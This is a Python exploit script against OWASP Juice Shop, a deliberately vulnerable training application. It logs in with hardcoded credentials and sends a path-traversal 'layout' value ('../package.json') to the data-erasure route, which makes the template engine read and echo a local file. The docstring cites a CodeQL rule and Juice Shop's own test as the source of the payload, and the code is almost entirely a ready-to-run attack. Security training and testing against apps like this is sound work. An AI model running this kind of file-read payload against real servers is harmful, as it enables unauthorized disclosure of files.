"""Local file read through the `layout` parameter of routes/dataErasure.ts.

req.body is spread into res.render's locals (CodeQL: js/template-object-injection),
so `layout` makes the template engine read an arbitrary file. Same payload as
Juice Shop's own API test ("erasure request with existing file path as layout
parameter returns content truncated", test/api/erasure-request.test.ts): reading
../package.json. Success: the response echoes that file's content.
"""

import json
import urllib.request

# bjoern.kimminich@gmail.com (has a security answer, as the official test uses).
USER = {"email": "bjoern.kimminich@gmail.com", "password": "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="}


def _login(base: str) -> str:
    req = urllib.request.Request(f"{base}/rest/user/login", data=json.dumps(USER).encode(),
                                 headers={"content-type": "application/json"})
    with urllib.request.urlopen(req) as res:
        return json.load(res)["authentication"]["token"]


def exploit(base: str) -> tuple[bool, str]:
    token = _login(base)
    req = urllib.request.Request(f"{base}/dataerasure/", data=json.dumps({"layout": "../package.json"}).encode(),
                                 headers={"content-type": "application/json", "Cookie": f"token={token}"})
    with urllib.request.urlopen(req) as res:
        body = res.read().decode("utf-8", "replace")
    return '"juice-shop"' in body, f"package.json leaked ({len(body)} bytes)" if '"juice-shop"' in body else "no leak"
